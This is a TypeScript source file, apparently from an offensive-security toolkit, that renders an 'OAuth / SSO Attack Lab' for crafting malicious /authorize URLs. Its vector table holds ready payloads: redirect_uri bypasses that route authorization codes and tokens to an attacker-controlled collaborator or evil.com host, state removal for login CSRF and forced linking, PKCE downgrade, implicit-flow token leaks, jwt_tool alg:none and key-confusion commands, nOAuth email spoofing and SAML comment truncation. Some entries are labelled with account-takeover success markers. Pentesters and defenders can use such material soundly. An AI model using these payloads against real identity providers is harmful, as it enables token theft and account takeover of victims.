import { h, clear } from '../lib/dom';
import { copyButton } from '../lib/copy';
import { substTarget, getToken, setToken, onTargetChange } from '../lib/target';
import { t } from '../lib/i18n';
import { ScrollTop } from '../components/scrolltop';

// OAuth / SSO Attack Lab — an OFFLINE crafter. Assembles a malicious /authorize URL you copy into a
// browser or Burp; the app never fires. Vectors that mutate the URL have an "Apply" toggle that
// actually rewrites the assembled URL; the rest carry a ready payload + the success marker.

interface Overrides { redirect: string; omitState: boolean; omitPkce: boolean; pkceMethod: string; responseType: string; extra: string[]; }

interface Flow { id: string; name: string; rt: string; pkce?: boolean; note: string; }
const FLOWS: Flow[] = [
  { id: 'code', name: 'Authorization Code', rt: 'code', note: 'самый частый; крадём code и меняем на токен на /token' },
  { id: 'pkce', name: 'Code + PKCE', rt: 'code', pkce: true, note: 'public-клиенты (SPA/мобайл); проверяем downgrade PKCE' },
  { id: 'implicit', name: 'Implicit', rt: 'token', note: 'access_token прилетает прямо в #fragment' },
  { id: 'hybrid', name: 'Hybrid', rt: 'code id_token', note: 'code и id_token сразу; больше каналов утечки' },
];

interface Vec { id: string; name: string; payload: string; desc?: string; success?: string; apply?: (ov: Overrides) => void; }
interface VecGroup { group: string; items: Vec[]; }
const VECTORS: VecGroup[] = [
  { group: 'redirect_uri: обход валидации', items: [
    { id: 'rt-trav', name: 'Path traversal', payload: '{REDIRECT_URI}/../../redirect?url=https://{COLLAB}', desc: 'AS матчит префикс/подстроку, а не точную строку', success: 'code или token уходит на твой хост', apply: (ov) => { ov.redirect = '{REDIRECT_URI}/../../redirect?url=https://{COLLAB}'; } },
    { id: 'rt-sub', name: 'Поддомен / @ / точка', payload: 'https://{REDIRECT_URI}.evil.com/cb   |   https://{REDIRECT_URI}@evil.com   |   https://evil.{REDIRECT_URI}/cb', desc: 'обход по части хоста', apply: (ov) => { ov.redirect = 'https://{REDIRECT_URI}@{COLLAB}/cb'; } },
    { id: 'rt-enc', name: 'Кодирование слэша', payload: '%2f   %252f   %5c   /./   ;%2e%2e   #', desc: 'одинарное/двойное кодирование пути и обрезка хвоста' },
    { id: 'rt-open', name: 'Open redirect на разрешённом хосте (Dirty Dancing)', payload: '{REDIRECT_URI}/out?next=https://{COLLAB}', desc: 'разрешённый хост сам редиректит ответ к тебе', success: 'code в query или token в #fragment на {COLLAB}', apply: (ov) => { ov.redirect = '{REDIRECT_URI}/out?next=https://{COLLAB}'; } },
  ] },
  { group: 'state / CSRF / привязка', items: [
    { id: 'st-omit', name: 'Убрать state', payload: '(state удаляется из authorize URL)', desc: 'forced account linking / login CSRF', success: 'callback логинит/привязывает без проверки', apply: (ov) => { ov.omitState = true; } },
    { id: 'st-static', name: 'Статичный или переиспользуемый state', payload: 'state=fixed123  (повтори тот же)', desc: 'не привязан к сессии, предсказуем' },
    { id: 'st-force', name: 'Forced linking', payload: 'авто-сабмит {REDIRECT_URI}?code=ATTACKER_CODE  в сессию жертвы', desc: 'свой неиспользованный code в callback жертвы', success: 'к аккаунту жертвы привязана твоя соц-личность' },
  ] },
  { group: 'PKCE downgrade', items: [
    { id: 'pk-strip', name: 'Снять code_challenge', payload: '(code_challenge и method удаляются)', desc: 'AS требует PKCE только если challenge присутствует', success: '/token принимает code без code_verifier', apply: (ov) => { ov.omitPkce = true; } },
    { id: 'pk-plain', name: 'S256 → plain', payload: 'code_challenge_method=plain', desc: 'если plain всё ещё принимается', apply: (ov) => { ov.pkceMethod = 'plain'; } },
  ] },
  { group: 'утечка code / token', items: [
    { id: 'lk-impl', name: 'Свитч на implicit', payload: 'response_type=token id_token', desc: 'если AS разрешает сменить response_type', success: 'токен в #fragment, читается opener/postMessage/Referer', apply: (ov) => { ov.responseType = 'token id_token'; } },
    { id: 'lk-mode', name: 'response_mode', payload: 'response_mode=form_post   |   fragment   |   query', desc: 'куда именно прилетит ответ', apply: (ov) => { ov.extra.push('response_mode=form_post'); } },
    { id: 'lk-prompt', name: 'prompt=none (silent auth)', payload: '&prompt=none', desc: 'тихий повторный выпуск без экрана согласия', success: 'токен выдаётся без взаимодействия жертвы', apply: (ov) => { ov.extra.push('prompt=none'); } },
    { id: 'lk-ref', name: 'Referer / opener leak', payload: 'callback с 3rd-party JS  ->  Referer: ...#access_token=', desc: 'фрагмент утекает через Referer или window.opener' },
  ] },
  { group: 'личность / ATO', items: [
    { id: 'id-noauth', name: 'nOAuth (мутабельный email-клейм)', payload: 'в своём IdP-тенанте: email = {USER_B}, затем Sign in with Microsoft', desc: 'RP матчит по email, а не по sub+iss / oid+tid', success: 'входишь как жертва без фишинга и кражи токена' },
    { id: 'id-pass', name: 'Pass-the-token (нет проверки aud)', payload: 'подставь свой access_token в /auth/social жертвы', desc: 'RP не проверяет aud/azp == свой client_id' },
    { id: 'id-jwt', name: 'id_token: alg:none / RS256→HS256', payload: 'jwt_tool <id_token> -X a    |    jwt_tool <id_token> -X k -pk jwks_pub.pem', desc: 'confusion подписи, role/email под контролем', success: 'форж id_token принимается RP' },
    { id: 'id-saml', name: 'SAML comment truncation / XSW', payload: '<NameID>{USER_B}<!---->.attacker.com</NameID>   (или SAML Raider XSW)', desc: 'парсер берёт текст до комментария, подпись валидна', success: 'вход как {USER_B} с подписанным ответом' },
  ] },
];

const LS = (k: string) => 'oauthlab.' + k;
const rd = (k: string, d = '') => { try { return localStorage.getItem(LS(k)) ?? d; } catch { return d; } };
const wr = (k: string, v: string) => { try { localStorage.setItem(LS(k), v); } catch { /* ignore */ } };

export function OAuthLabView(outlet: HTMLElement): () => void {
  clear(outlet);

  const state = {
    flow: rd('flow', 'code'),
    authz: rd('authz', 'https://idp.{TARGET}/authorize'),
    client: rd('client') || getToken('CLIENT_ID') || '{CLIENT_ID}',
    redirect: rd('redirect') || getToken('REDIRECT_URI') || '{REDIRECT_URI}',
    scope: rd('scope', 'openid email profile'),
    csrf: rd('csrf', 'xyz123'),
  };
  const applied = new Set<string>();
  const vecById: Record<string, Vec> = {};
  for (const g of VECTORS) for (const v of g.items) vecById[v.id] = v;
  const applyBtns: { id: string; btn: HTMLElement }[] = [];

  const urlCode = h('code', { class: 'oauth-url-code' });

  function flow(): Flow { return FLOWS.find((f) => f.id === state.flow) ?? FLOWS[0]!; }

  function buildOverrides(): Overrides {
    const ov: Overrides = { redirect: '', omitState: false, omitPkce: false, pkceMethod: '', responseType: '', extra: [] };
    for (const id of applied) vecById[id]?.apply?.(ov);
    return ov;
  }
  function rawUrl(): string {
    const f = flow(); const ov = buildOverrides();
    const rt = ov.responseType || f.rt;
    const p: string[] = [
      'response_type=' + encodeURIComponent(rt),
      'client_id=' + state.client,
      'redirect_uri=' + (ov.redirect || state.redirect),
      'scope=' + encodeURIComponent(state.scope),
    ];
    if (!ov.omitState) p.push('state=' + state.csrf);
    if (rt.includes('token')) p.push('nonce=n0nce');
    if (f.pkce && !ov.omitPkce) { p.push('code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM'); p.push('code_challenge_method=' + (ov.pkceMethod || 'S256')); }
    for (const e of ov.extra) p.push(e);
    return state.authz + '?' + p.join('&');
  }
  function renderUrl() {
    const sub = substTarget(rawUrl());
    urlCode.textContent = sub.out;
    urlCode.classList.toggle('tgt', sub.changed);
  }
  function refreshApply() {
    for (const { id, btn } of applyBtns) {
      const on = applied.has(id);
      btn.classList.toggle('on', on);
      btn.textContent = on ? t('oauth.applied') : t('oauth.apply');
    }
  }
  function toggleApply(id: string) {
    if (applied.has(id)) applied.delete(id); else applied.add(id);
    renderUrl(); refreshApply();
  }

  // ---- 1. flow selector ----
  const flowRow = h('div', { class: 'oauth-flows' });
  for (const f of FLOWS) {
    const btn = h('button', { class: 'mode-btn' + (f.id === state.flow ? ' on' : ''), type: 'button', title: f.note,
      onclick: () => { state.flow = f.id; wr('flow', f.id); applied.clear(); flowRow.querySelectorAll('.mode-btn').forEach((b) => b.classList.remove('on')); btn.classList.add('on'); flowNote.textContent = f.note; renderUrl(); refreshApply(); } }, f.name);
    flowRow.appendChild(btn);
  }
  const flowNote = h('div', { class: 'oauth-flow-note' }, flow().note);

  // ---- 2. param inputs (client_id/redirect_uri also feed the shared context tokens) ----
  const fields: [keyof typeof state, string, string][] = [
    ['authz', t('oauth.authz'), 'https://idp.example.com/authorize'],
    ['client', 'client_id', '{CLIENT_ID}'],
    ['redirect', 'redirect_uri', '{REDIRECT_URI}'],
    ['scope', 'scope', 'openid email'],
    ['csrf', 'state', 'xyz123'],
  ];
  const form = h('div', { class: 'oauth-form' });
  for (const [key, label, ph] of fields) {
    const inp = h('input', { class: 'oauth-inp', value: state[key], placeholder: ph, spellcheck: 'false' }) as HTMLInputElement;
    inp.addEventListener('input', () => {
      state[key] = inp.value; wr(key, inp.value);
      if (key === 'client') setToken('CLIENT_ID', inp.value);
      if (key === 'redirect') setToken('REDIRECT_URI', inp.value);
      renderUrl();
    });
    form.appendChild(h('label', { class: 'oauth-field' }, h('span', { class: 'oauth-flabel' }, label), inp));
  }

  // ---- assembled URL ----
  const copyUrl = copyButton(() => substTarget(rawUrl()).out, t('oauth.copy'));
  copyUrl.classList.add('oauth-url-copy');
  const resetBtn = h('button', { class: 'oauth-reset', type: 'button', onclick: () => { applied.clear(); renderUrl(); refreshApply(); } }, t('oauth.resetUrl'));
  const urlWrap = h('div', { class: 'oauth-url' }, urlCode, copyUrl);

  // ---- context inputs for {COLLAB} / {USER_B} (used by vectors) ----
  const collabInp = h('input', { class: 'oauth-ctx-inp', value: getToken('COLLAB'), placeholder: 'abc.oast.pro', spellcheck: 'false' }) as HTMLInputElement;
  collabInp.addEventListener('input', () => { setToken('COLLAB', collabInp.value); renderUrl(); });
  const userBInp = h('input', { class: 'oauth-ctx-inp', value: getToken('USER_B'), placeholder: 'victim@target.com', spellcheck: 'false' }) as HTMLInputElement;
  userBInp.addEventListener('input', () => setToken('USER_B', userBInp.value));
  const ctxRow = h('div', { class: 'oauth-ctx' },
    h('label', { class: 'oauth-ctx-field' }, h('span', {}, '{COLLAB}'), collabInp),
    h('label', { class: 'oauth-ctx-field' }, h('span', {}, '{USER_B}'), userBInp));

  // ---- attack vectors ----
  const vecWrap = h('div', { class: 'oauth-vectors' });
  for (const g of VECTORS) {
    const groupBody = h('div', { class: 'oauth-vgroup-body' });
    for (const v of g.items) {
      const sub = substTarget(v.payload);
      const actions = h('div', { class: 'oauth-vec-actions' });
      if (v.apply) {
        const ab = h('button', { class: 'oauth-apply', type: 'button', onclick: () => toggleApply(v.id) }, t('oauth.apply'));
        applyBtns.push({ id: v.id, btn: ab });
        actions.appendChild(ab);
      }
      const cp = copyButton(() => substTarget(v.payload).out, t('oauth.copy'));
      cp.classList.add('oauth-vec-copy2');
      actions.appendChild(cp);
      const card = h('div', { class: 'oauth-vec' },
        h('div', { class: 'oauth-vec-head' }, h('span', { class: 'oauth-vec-name' }, v.name), actions),
        v.desc ? h('div', { class: 'oauth-vec-desc' }, v.desc) : null,
        h('code', { class: 'oauth-vec-code' + (sub.changed ? ' tgt' : '') }, sub.out),
        v.success ? h('div', { class: 'oauth-vec-ok' }, h('b', {}, t('oauth.success')), ' ', v.success) : null);
      groupBody.appendChild(card);
    }
    vecWrap.appendChild(h('div', { class: 'oauth-vgroup' }, h('div', { class: 'oauth-vgroup-h' }, g.group), groupBody));
  }

  const content = h('div', { class: 'content oauth-lab' },
    h('h1', { class: 'cat-h' }, 'OAuth / SSO Lab'),
    h('div', { class: 'script-intro' }, t('oauth.howto')),
    h('div', { class: 'oauth-section-h' }, t('oauth.step1')), flowRow, flowNote,
    h('div', { class: 'oauth-section-h' }, t('oauth.step2')), form, ctxRow,
    h('div', { class: 'oauth-section-h oauth-url-h' }, h('span', {}, t('oauth.step3')), resetBtn), urlWrap,
    h('div', { class: 'oauth-url-hint' }, t('oauth.urlHint')),
    h('div', { class: 'oauth-section-h' }, t('oauth.step4')), vecWrap);
  outlet.appendChild(content);
  const scrollTop = ScrollTop();
  outlet.appendChild(scrollTop.el);

  const off = onTargetChange(() => renderUrl());
  renderUrl();
  return () => { off(); scrollTop.destroy(); };
}
